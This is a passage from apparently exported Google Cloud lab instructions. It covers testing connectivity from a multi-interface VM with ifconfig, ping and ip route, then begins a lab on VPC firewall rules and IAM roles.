assigned an internal IP address within that subnet (10.128.0.0/20), and has applicable firewall rules.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Each network interface has its own internal IP address so that the VM instance can communicate with those networks.</span></p><ol start='' ><li><p><span>In the Cloud console, navigate to </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>VM instances</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>vm-appliance</span></strong><span>, click </span><strong><span>SSH</span></strong><span> to launch a terminal and connect.</span></p></li><li><p><span>Run the following, to list the network interfaces within the VM instance:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo ifconfig</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1460</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  inet 172.16.0.3  netmask 255.255.255.255  broadcast 172.16.0.3</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  inet6 fe80::4001:acff:fe10:3  prefixlen 64  scopeid 0x20&lt;link&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  ether 42:01:ac:10:00:03  txqueuelen 1000  (Ethernet)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  RX packets 626  bytes 171556 (167.5 KiB)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  RX errors 0  dropped 0  overruns 0  frame 0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  TX packets 568  bytes 62294 (60.8 KiB)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1460</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  inet 10.130.0.3  netmask 255.255.255.255  broadcast 10.130.0.3</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  inet6 fe80::4001:aff:fe82:3  prefixlen 64  scopeid 0x20&lt;link&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  ether 42:01:0a:82:00:03  txqueuelen 1000  (Ethernet)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  RX packets 7  bytes 1222 (1.1 KiB)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  RX errors 0  dropped 0  overruns 0  frame 0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  TX packets 17  bytes 1842 (1.7 KiB)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">eth2: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1460</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  inet 10.128.0.3  netmask 255.255.255.255  broadcast 10.128.0.3</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  inet6 fe80::4001:aff:fe80:3  prefixlen 64  scopeid 0x20&lt;link&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  ether 42:01:0a:80:00:03  txqueuelen 1000  (Ethernet)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  RX packets 17  bytes 2014 (1.9 KiB)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  RX errors 0  dropped 0  overruns 0  frame 0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  TX packets 17  bytes 1862 (1.8 KiB)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 540px;"></div><div class="CodeMirror-gutters" style="display: none; height: 540px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> The </span><strong><span>sudo ifconfig</span></strong><span> command lists a Linux VM&#39;s network interfaces along with the internal IP addresses for each interface.</span></p><h3 id='explore-the-network-interface-connectivity'><span>Explore the network interface connectivity</span></h3><p><span>Demonstrate that the </span><strong><span>vm-appliance</span></strong><span> instance is connected to </span><strong><span>privatesubnet-1</span></strong><span>, </span><strong><span>managementsubnet-1</span></strong><span> and </span><strong><span>mynetwork</span></strong><span> by pinging VM instances on those subnets.</span></p><ol start='' ><li><p><span>In the Cloud console, navigate to </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>VM instances</span></strong><span>.</span></p></li><li><p><span>Note the internal IP addresses for </span><strong><span>privatenet-vm-1</span></strong><span>, </span><strong><span>managementnet-vm-1</span></strong><span>, </span><strong><span>mynet-vm-1</span></strong><span>, and </span><strong><span>mynet-vm-2</span></strong><span>.</span></p></li><li><p><span>Return to the </span><strong><span>SSH</span></strong><span> terminal for </span><strong><span>vm-appliance</span></strong><span>.</span></p></li><li><p><span>To test connectivity to </span><strong><span>privatenet-vm-1</span></strong><span>&#39;s internal IP, run the following command, replacing </span><strong><span>privatenet-vm-1</span></strong><span>&#39;s internal IP:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ping -c 3 'Enter privatenet-vm-1's internal IP here'</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>This works!</span></p><ol start='' ><li><p><span>Repeat the same test by running the following:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ping -c 3 privatenet-vm-1</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> You are able to ping </span><strong><span>privatenet-vm-1</span></strong><span> by its name because VPC networks have an internal DNS service that allows you to address instances by their DNS names rather than their internal IP addresses. When an internal DNS query is made with the instance hostname, it resolves to the primary interface (nic0) of the instance. Therefore, this only works for </span><strong><span>privatenet-vm-1</span></strong><span> in this case.</span></p><ol start='' ><li><p><span>To test connectivity to </span><strong><span>managementnet-vm-1</span></strong><span>&#39;s internal IP, run the following command, replacing </span><strong><span>managementnet-vm-1</span></strong><span>&#39;s internal IP:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ping -c 3 'Enter managementnet-vm-1's internal IP here'</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>This works!</span></p><ol start='' ><li><p><span>To test connectivity to </span><strong><span>mynet-vm-1</span></strong><span>&#39;s internal IP, run the following command, replacing </span><strong><span>mynet-vm-1</span></strong><span>&#39;s internal IP:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ping -c 3 'Enter mynet-vm-1's internal IP here'</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>This works!</span></p><ol start='' ><li><p><span>To test connectivity to </span><strong><span>mynet-vm-2</span></strong><span>&#39;s internal IP, run the following command, replacing </span><strong><span>mynet-vm-2</span></strong><span>&#39;s internal IP:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ping -c 3 'Enter mynet-vm-2's internal IP here'</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> This does not work! In a multiple interface instance, every interface gets a route for the subnet that it is in. In addition, the instance gets a single default route that is associated with the primary interface eth0. Unless manually configured otherwise, any traffic leaving an instance for any destination other than a directly connected subnet will leave the instance via the default route on eth0.</span></p><ol start='' ><li><p><span>To list the routes for </span><strong><span>vm-appliance</span></strong><span> instance, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ip route</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">default via 172.16.0.1 dev eth0</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">10.128.0.0/20 via 10.128.0.1 dev eth2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">10.128.0.1 dev eth2 scope link</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">10.130.0.0/20 via 10.130.0.1 dev eth1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">10.130.0.1 dev eth1 scope link</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">172.16.0.0/24 via 172.16.0.1 dev eth0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">172.16.0.1 dev eth0 scope link</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 158px;"></div><div class="CodeMirror-gutters" style="display: none; height: 158px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> The primary interface eth0 gets the default route (default via 172.16.0.1 dev eth0), and all three interfaces eth0, eth1 and eth2 get routes for their respective subnets. Since, the subnet of </span><strong><span>mynet-vm-2</span></strong><span> (</span><strong><span>10.132.0.0/20</span></strong><span>) is not included in this routing table, the ping to that instance leaves </span><strong><span>vm-appliance</span></strong><span> on eth0 (which is on a different VPC network). You could change this behavior by configuring policy routing as documented in the </span><a href='https://cloud.google.com/vpc/docs/create-use-multiple-interfaces#configuring_policy_routing'><span>Configuring policy routing section of the Google Cloud Guide</span></a><span>.</span></p><h2 id='congratulations-32'><span>Congratulations!</span></h2><p><span>In this lab you created a VM instance with three network interfaces and verified internal connectivity for VM instances that are on the subnets that are attached to the multiple interface VM.</span></p><p><span>You also explored the default network along with its subnets, routes, and firewall rules. You then created tested connectivity for a new auto mode VPC network.</span></p><p>&nbsp;</p><h2 id='lab---vpc-networks---controlling-access'><span>LAB - VPC Networks - Controlling Access</span></h2><h2 id='overview-36'><span>Overview</span></h2><p><span>In the real-world you need to protect sensitive data and ensure the continued availability of your web applications at all times. Learn how to use the Google Cloud VPC network to create a more secure, scalable, and manageable web server deployment within your Google Cloud environment.</span></p><p><span>In this lab, you create two nginx web servers on the default VPC network and control external HTTP access to the web servers using tagged firewall rules. Then, you explore IAM roles and service accounts.</span></p><ul><li><p><span>Two web servers gives you redundancy - if one web server fails, the other can continue serving web traffic, preventing downtime.</span></p></li><li><p><span>Tagged firewall rules provide granular control over which traffic is allowed to reach specific web servers.</span></p></li><li><p><span>By assigning a service account permission to perform tasks, you&#39;re upholding the principal of least priviledge, keeping your Cloud resources safe.</span></p></li></ul><h3 id='objectives-24'><span>Objectives</span></h3><p><span>In this lab, you learn how to perform the following tasks:</span></p><ul><li><p><span>Create a nginx web server on a vpc network</span></p></li><li><p><span>Create tagged firewall rules</span></p></li><li><p><span>Create a service account with IAM roles</span></p></li><li><p><span>Explore permissions for the Network Admin and Security Admin roles</span></p></li></ul><h2 id='setup-and-requirements-32'><span>Setup and requirements</span></h2><h3 id='before-you-click-the-start-lab-button-19'><span>Before you click the Start Lab button</span></h3><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources are made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.</span></p><ul><li><p><span>Time to complete the lab—remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.</span></p><h3 id='how-to-start-your-lab-and-sign-in-to-the-google-cloud-console-14'><span>How to start your lab and sign in to the Google Cloud console</span></h3><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:</span></p><ul><li><p><span>The Open Google Cloud console button</span></p></li><li><p><span>Time remaining</span></p></li><li><p><span>The temporary credentials that you must use for this lab</span></p></li><li><p><span>Other information, if needed, to step through this lab</span></p></li></ul></li><li><p><span>Click </span><strong><span>Open Google Cloud console</span></strong><span> (or right-click and select </span><strong><span>Open Link in Incognito Window</span></strong><span> if you are running the Chrome browser).</span></p><p><span>The lab spins up resources, and then opens another tab that shows the Sign in page.</span></p><p><span>*</span><strong><span>Tip:</span><span>*</span></strong><span> Arrange the tabs in separate windows, side-by-side.</span></p><p><strong><span>Note:</span></strong><span> If you see the </span><strong><span>Choose an account</span></strong><span> dialog, click </span><strong><span>Use Another Account</span></strong><span>.</span></p></li><li><p><span>If necessary, copy the </span><strong><span>Username</span></strong><span> below and paste it into the </span><strong><span>Sign in</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"Username"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Username in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Copy the </span><strong><span>Password</span></strong><span> below and paste it into the </span><strong><span>Welcome</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div 